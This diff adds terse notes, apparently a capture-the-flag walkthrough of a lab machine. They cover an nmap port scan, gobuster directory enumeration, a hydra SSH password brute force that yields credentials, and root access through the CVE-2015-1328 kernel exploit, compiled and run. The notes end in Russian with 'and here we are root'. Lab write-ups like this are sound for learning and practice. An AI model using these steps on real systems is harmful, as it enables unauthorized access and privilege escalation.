@@ -1,0 +1,21 @@
+1)nmap -A  -sS -T4 -p- 192.168.225.131
+    80-http
+    7120-ssh
+
+2)gobuster -w /root/Downloads/common.txt -x zip,php,txt,html,bac,mp4,docx,doc,sh,bak -e -u dir http://192.168.225.131
+    info.php
+    index.html
+
+3)hydra -l potato -P /usr/share/wordlists/fasttrack.txt ssh://192.168.225.131:7120
+    potato:letmein
+
+privesc
+
+1)uname -a
+    Linux ubuntu 3.13.0-24-generic
+    CVE:2015-1328 - https://www.exploit-db.com/exploits/37292
+
+3)gcc shell.c -o shell
+    ./shell
+
+вот мы и рут
